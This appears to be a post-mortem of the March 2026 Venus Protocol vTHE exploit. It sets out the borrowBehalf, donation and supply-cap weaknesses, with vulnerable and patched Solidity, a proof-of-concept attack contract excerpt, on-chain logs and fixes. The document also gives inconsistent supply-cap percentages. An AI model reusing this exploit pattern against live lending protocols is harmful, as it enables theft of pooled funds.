# Venus Protocol THE — BorrowBehalf + Donation Attack Analysis

| Item | Details |
|------|---------|
| **Date** | 2026-03-15 |
| **Protocol** | Venus Protocol |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~913K CAKE + ~1,972 WBNB (~$14.9M total borrowed, $2.15M bad debt) |
| **Attacker** | [0x43C7...6F82](https://bscscan.com/address/0x43C743e316F40d4511762EEdf6f6D484F67b2F82) |
| **Attack Contract** | [0x737b...a619](https://bscscan.com/address/0x737bc98F1D34E19539C074B8Ad1169d5d45dA619) |
| **Attack Tx** | [0x4f47...663f](https://bscscan.com/tx/0x4f477e941c12bbf32a58dc12db7bb0cb4d31d41ff25b2457e6af3c15d7f5663f) |
| **Vulnerable Contract** | vTHE ([0x86e0...739f](https://bscscan.com/address/0x86e06EAfa6A1eA631Eab51DE500E3D474933739f)) |
| **Root Cause** | Exchange rate inflation via donation + monetizing inflated collateral value via borrowBehalf |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Venus_THE_exp.sol) |
| **On-Chain Verification** | All amounts in PoC exactly match on-chain Tx (see Section 8 below) |

---

## 1. Vulnerability Overview

This attack exploited a combination of **three weaknesses** in Venus Protocol:

1. **No access control on `borrowBehalf`** — Anyone can execute a loan on behalf of another user, with funds delivered to the caller
2. **Supply cap bypass** — Supply cap validation only exists in `mint()`, and tokens can be sent directly to the vToken contract via ERC-20 `transfer`, bypassing the check
3. **Exchange rate inflation** — Directly transferred tokens are reflected in the `exchangeRate` calculation, artificially inflating collateral value

---

## 2. Vulnerable Code Analysis

### 2.1 borrowBehalf — Missing Access Control (Core Vulnerability)

The `borrowBehalf` function in `VBep20.sol` as deployed at the time of the attack:

```solidity
// Vulnerable code at time of attack (no access control)
function borrowBehalf(address borrower, uint borrowAmount) external returns (uint) {
    // ❌ Does not check whether borrower has approved the caller
    // Anyone can borrow on behalf of another user; funds go to msg.sender (caller)
    return borrowInternal(borrower, payable(msg.sender), borrowAmount);
}
```

Comparison with the post-incident patched code:

```solidity
// Patched code (access control added)
function borrowBehalf(address borrower, uint borrowAmount) external returns (uint) {
    // ✅ Verifies that borrower has approved msg.sender as a delegate
    require(comptroller.approvedDelegates(borrower, msg.sender), "not an approved delegate");
    return borrowInternal(borrower, payable(msg.sender), borrowAmount);
}
```

**Problem**: `borrower` and `receiver` are separated. The debt is recorded against `borrower`, but funds are delivered to `msg.sender`.

### 2.2 borrowFresh — Borrower/Receiver Separation

```solidity
function borrowFresh(
    address borrower,       // The account against which debt is recorded
    address payable receiver, // The account that receives funds (= msg.sender)
    uint borrowAmount,
    bool shouldTransfer
) internal returns (uint) {
    uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);
    if (allowed != 0) {
        revert("math error");
    }

    // ...

    // ❌ Debt is recorded against borrower
    accountBorrows[borrower].principal = vars.accountBorrowsNew;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = vars.totalBorrowsNew;

    // ❌ Funds are delivered to receiver (= attacker)
    if (shouldTransfer) {
        doTransferOut(receiver, borrowAmount);
    }

    emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);
    return uint(Error.NO_ERROR);
}
```

### 2.3 exchangeRateStoredInternal — Donation Attack Surface

```solidity
function exchangeRateStoredInternal() internal view virtual returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        // totalCash = underlying token balance held by the contract
        // ❌ Tokens sent via direct transfer are also included in totalCash
        uint totalCash = _getCashPriorWithFlashLoan();

        // exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
        // ❌ Increasing totalCash raises the exchangeRate
        // ❌ totalSupply is unchanged, so existing vToken holders' collateral value is inflated
        (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(
            totalCash, totalBorrows, totalReserves
        );
        (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);
        return (MathError.NO_ERROR, exchangeRate.mantissa);
    }
}
```

### 2.4 mintFresh — Supply Cap Only Applied to mint()

```solidity
function mintFresh(address minter, uint mintAmount) internal returns (uint, uint) {
    // ✅ Comptroller supply cap validation runs only through the mint() path
    uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);
    if (allowed != 0) {
        return (failOpaque(...), 0);
    }
    // ...
}
// ❌ Direct ERC-20 transfer bypasses mint(), completely circumventing supply cap validation
```

---

## 3. Attack Flow

### 3.1 Preparation Phase (June 2025 – March 15, 2026)

1. Received 7,447 ETH via Tornado Cash
2. Deposited as collateral on Aave and borrowed $9.92M in stablecoins
3. Distributed across 6 wallets and gradually accumulated THE tokens over ~9 months
4. 6 EOAs executed THE `type(uint256).max` approvals to the future attack contract address (pre-computed via CREATE2)

**Attacker's THE Holdings (on-chain verified at block 86731940)**:

| Wallet | THE Balance | % of Total Supply |
|--------|------------|-------------------|
| 0xf052...58AA | 13,223,597 THE | 4.62% |
| 0x89E3...dDB6 | 9,474,403 THE | 3.31% |
| 0xbb37...ef87 | 7,532,701 THE | 2.63% |
| 0x564A...4591 | 3,915,245 THE | 1.37% |
| 0x16f0...bF07 | 1,252,816 THE | 0.44% |
| 0x1A35...6231 (Victim) | 697,951 THE | 0.24% |
| **Total** | **36,096,716 THE** | **12.62%** |

- THE total supply: 285,975,220 THE
- vTHE supply cap: 14.5M THE — attacker's holdings are **249% of the supply cap**
- **All 6 wallets are attacker-controlled** (all have unlimited approvals to the same future contract)
- **Victim (0x1A35...) is also an attacker wallet** — a self-owned wallet with vTHE collateral deposited in Venus. The attacker used `borrowBehalf` to borrow under this wallet's name while the attack contract received the funds

### 3.2 Execution Phase (March 15, 2026, ~11:55 UTC)

```
┌─────────────────────────────────────────────────────────────────┐
│ Step 1: THE Donation — Supply Cap Bypass + Exchange Rate Inflation│
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  EOA 0 ──transferFrom──▶ vTHE  (+13.2M THE)                    │
│  EOA 1 ──transferFrom──▶ vTHE  (+ 9.5M THE)                    │
│  EOA 2 ──transferFrom──▶ vTHE  (+ 7.5M THE)                    │
│  EOA 3 ──transferFrom──▶ vTHE  (+ 3.9M THE)                    │
│  Victim ─transferFrom──▶ vTHE  (+ 0.7M THE)                    │
│  EOA 5 ──transferFrom──▶ vTHE  (+ 1.3M THE)                    │
│                           ────────────────                      │
│                           Total ~36M THE directly transferred   │
│                                                                 │
│  Result: vTHE exchange rate inflated 3.81x                      │
│          Victim's vTHE collateral value spikes                  │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 2: borrowBehalf — Borrow USDC Under Victim's Name          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Attacker ──borrowBehalf(Victim, 1.58M USDC)──▶ vUSDC          │
│                                                                 │
│  Debt: recorded against Victim's account                        │
│  Funds: delivered to attacker (msg.sender)                      │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 3: Recursive Leverage — Further Amplifying Collateral Value │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Mint vUSDC with borrowed USDC ──▶ obtain new collateral        │
│  enterMarkets with vUSDC ──▶ register as collateral             │
│  Borrow THE from vTHE ──▶ borrow 4.6M THE                      │
│  Transfer borrowed THE back to vTHE ──▶ further rate increase   │
│                                                                 │
│  Result: borrowing capacity amplified ~7x                       │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 4: Final Borrow — Multiple Assets Under Victim's Name      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  borrowBehalf(Victim, 913K CAKE)  ──▶ received by attacker      │
│  borrowBehalf(Victim, 1,972 WBNB) ──▶ received by attacker      │
│                                                                 │
│  What Victim is left with: inflated vTHE collateral + massive debt│
│  What attacker walks away with: CAKE + WBNB (real assets)       │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Collapse Phase (~12:42 UTC onward)

- THE buying pressure evaporates → price crashes from $0.51 to $0.22
- 254 liquidation bots attempt 8,048 liquidations
- Illiquid THE collateral cannot be converted at sufficient value → **$2.15M bad debt** incurred

---

## 4. PoC Code (DeFiHackLabs)

```solidity
contract VenusVtheBorrowBehalfRuntime {
    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;

    function attack() external {
        // Step 1: Directly transfer pre-approved THE from 6 EOAs to vTHE (donation)
        _donateVictimApprovedTHE();

        // Step 2: Borrow USDC under victim's name; funds received by attacker (this)
        require(VUSDC.borrowBehalf(VICTIM, USDC_BORROW_AMOUNT) == 0);

        // Step 3: Mint vUSDC with borrowed USDC → obtain collateral
        require(USDC.approve(address(VUSDC), USDC_BORROW_AMOUNT));
        require(VUSDC.mint(USDC_BORROW_AMOUNT) == 0);

        // Enter collateral market
        address[] memory markets = new address[](1);
        markets[0] = address(VUSDC);
        COMPTROLLER.enterMarkets(markets);

        // Step 4: Borrow THE and re-donate to vTHE → further exchange rate inflation
        require(VTHE.borrow(THE_SELF_BORROW_AMOUNT) == 0);
        require(THE.transfer(address(VTHE), THE_SELF_BORROW_AMOUNT));

        // Step 5: Borrow CAKE and WBNB under victim's name using inflated collateral
        require(VCAKE.borrowBehalf(VICTIM, CAKE_BORROW_AMOUNT) == 0);
        require(VWBNB.borrowBehalf(VICTIM, WBNB_BORROW_AMOUNT) == 0);
    }

    function _donateVictimApprovedTHE() internal {
        // Directly transfer THE from 6 EOAs to the vTHE contract
        // Bypasses supply cap validation since mint() is not called
        THE.transferFrom(0xf052...58AA, address(VTHE), 13_223_597e18);
        THE.transferFrom(0x89E3...DB6,  address(VTHE),  9_474_403e18);
        THE.transferFrom(0xbb37...f87,  address(VTHE),  7_532_701e18);
        THE.transferFrom(0x564A...591,  address(VTHE),  3_915_245e18);
        THE.transferFrom(VICTIM,        address(VTHE),    697_951e18);
        THE.transferFrom(0x16f0...B07,  address(VTHE),  1_252_816e18);
        // Total ~36M THE → exchange rate inflated 3.81x
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| V-01 | Missing access control on `borrowBehalf` | **CRITICAL** | CWE-284 (Improper Access Control) |
| V-02 | Supply cap bypass (direct transfer) | **HIGH** | CWE-20 (Improper Input Validation) |
| V-03 | Exchange rate manipulation (Donation Attack) | **HIGH** | CWE-682 (Incorrect Calculation) |

### V-01: Missing Access Control on borrowBehalf

- **Description**: `borrowBehalf(borrower, amount)` can be called without approval from the borrower. Debt is recorded against the borrower while the caller receives the funds.
- **Impact**: Any user can borrow without limit on behalf of another user who holds vToken collateral
- **Exploit Condition**: Immediately exploitable if the victim holds sufficient collateral (vTokens)

### V-02: Supply Cap Bypass

- **Description**: The supply cap check in `mintAllowed()` only applies to the `mint()` call path. Sending the underlying token directly to the vToken contract via `ERC20.transfer()` ignores the supply cap entirely.
- **Impact**: Tokens can be injected up to 367% of the supply cap, enabling artificial exchange rate manipulation

### V-03: Exchange Rate Manipulation (Donation Attack)

- **Description**: In the calculation `exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply`, `totalCash` is the contract's actual token balance. Increasing `totalCash` via direct transfer raises the exchange rate proportionally while `totalSupply` remains unchanged.
- **Impact**: Existing vToken holders' collateral value is artificially inflated, enabling excessive borrowing

---

## 6. Remediation Recommendations

### Immediate Fix

```solidity
// V-01 fix: Add delegate approval validation to borrowBehalf
function borrowBehalf(address borrower, uint borrowAmount) external returns (uint) {
    require(
        comptroller.approvedDelegates(borrower, msg.sender),
        "not an approved delegate"
    );
    return borrowInternal(borrower, payable(msg.sender), borrowAmount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------------|-------------------|
| V-01 | Require explicit borrower approval via `approvedDelegates` mapping (patch applied) |
| V-02 | Re-validate supply cap based on `balanceOf` whenever vToken balance changes, or track `totalCash` via an internal accounting variable |
| V-03 | Limit exchange rate fluctuation (circuit breaker); introduce liquidity-based collateral valuation |
| Common | Governance alert when a single entity's supply concentration exceeds a threshold relative to the supply cap |

---

## 7. Lessons Learned

1. **`*Behalf` patterns are dangerous** — Any function that modifies state on behalf of another user must have an explicit approval mechanism.
2. **Supply caps must be validated on every path** — Validating only `mint()` while ignoring direct `transfer` renders the cap meaningless.
3. **Exchange rate must not depend on external inputs** — Using the contract's actual balance (`balanceOf`) directly exposes it to donation attacks. An internal accounting variable must be maintained separately.
4. **Illiquid assets must not be accepted at face value as collateral** — Liquidation must reflect the actual realizable value (market depth).
5. **Exchange rate should be computed from internal accounting variables** — Using `balanceOf(address(this))` directly exposes it to donation attacks. Maintaining a separate internal accounting variable prevents directly transferred tokens from affecting the exchange rate.

---

## 8. On-Chain Verification

The event logs from attack Tx [0x4f47...663f](https://bscscan.com/tx/0x4f477e941c12bbf32a58dc12db7bb0cb4d31d41ff25b2457e6af3c15d7f5663f) were decoded using `cast` and cross-referenced against the PoC.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Constant | On-Chain Actual | Match |
|------|-------------|----------------|-------|
| Total THE donated | 36,096,716 THE | 36,096,716 THE | **Exact match** |
| USDC borrowBehalf | 1,581,454 USDC | 1,581,454 USDC | **Exact match** |
| THE self-borrow + re-donation | 4,628,903 THE | 4,628,903 THE | **Exact match** |
| CAKE borrowBehalf | 913,858 CAKE | 913,858 CAKE | **Exact match** |
| WBNB borrowBehalf | 1,972 WBNB | 1,972 WBNB | **Exact match** |

### 8.2 On-Chain Event Log Sequence

```
[0-5]   THE Transfer: 6 EOAs → vTHE (donation, total 36,096,716 THE)
[10]    vUSDC Mint: attack contract prepares vUSDC issuance
[12]    Comptroller BorrowAllowed: USDC borrow approved
[13]    USDC Transfer: vUSDC → attack contract (1,581,454 USDC) ← borrowBehalf
[18]    USDC Transfer: attack contract → vUSDC (mint with borrowed USDC)
[21]    vUSDC Transfer: attack contract receives vUSDC shares
[26]    THE Transfer: vTHE → attack contract (4,628,903 THE borrow)
[29]    THE Transfer: attack contract → vTHE (re-donation)
[35]    CAKE Transfer: vCAKE → attack contract (913,858 CAKE) ← borrowBehalf
[41]    WBNB Transfer: vWBNB → attack contract (1,972 WBNB) ← borrowBehalf
```

### 8.3 Pre-Approval Verification

At the block immediately before the attack (86731940), all 6 EOAs had THE token allowances set to `type(uint256).max`:

```
0xf052...58AA → attack contract: type(uint256).max ✅
0x89E3...dDB6 → attack contract: type(uint256).max ✅
0xbb37...ef87 → attack contract: type(uint256).max ✅
0x564A...4591 → attack contract: type(uint256).max ✅
0x1A35...6231 → attack contract: type(uint256).max ✅ (Victim)
0x16f0...bF07 → attack contract: type(uint256).max ✅
```

The attack contract (0x737b...) was **deployed in this Tx** (confirmed via `contractAddress` field). Since approvals were in place before deployment, it is concluded that the address was pre-computed using CREATE2 or a similar mechanism.

---

## 9. Related Cases: Other Attacks with the Same Root Cause

Exchange rate inflation via donation is not a vulnerability unique to Venus THE — it is a **structural weakness applicable across Compound V1/V2 forks and ERC-4626 Vaults broadly**.

| Case | Date | Protocol | Donation Method | Profit Extraction | Loss |
|------|------|----------|----------------|-------------------|------|
| **Venus THE** | 2026-03-15 | Venus (BSC) | Direct THE transfer → vTHE | Borrow under victim's name via `borrowBehalf` | ~$14.9M |
| **dLEND cbBTC** | 2026-03-17 | dLEND (ETH) | Repeated cbBTC deposit + no withdrawal | Over-redemption via share redeem | 7.72 cbBTC |
| **Euler Finance** | 2023-03-13 | Euler (ETH) | `donateToReserves()` | Exploiting liquidation mechanism | $197M |

All three share the same root cause: **`exchangeRate = totalCash / totalSupply` where `totalCash` uses the contract's actual balance (`balanceOf`)**.

### Fundamental Defense Principle

```solidity
// ❌ Vulnerable: uses actual balance — manipulable via donation
uint totalCash = token.balanceOf(address(this));

// ✅ Safe: uses internal accounting variable — direct transfers not reflected
uint totalCash = internalBalance;
```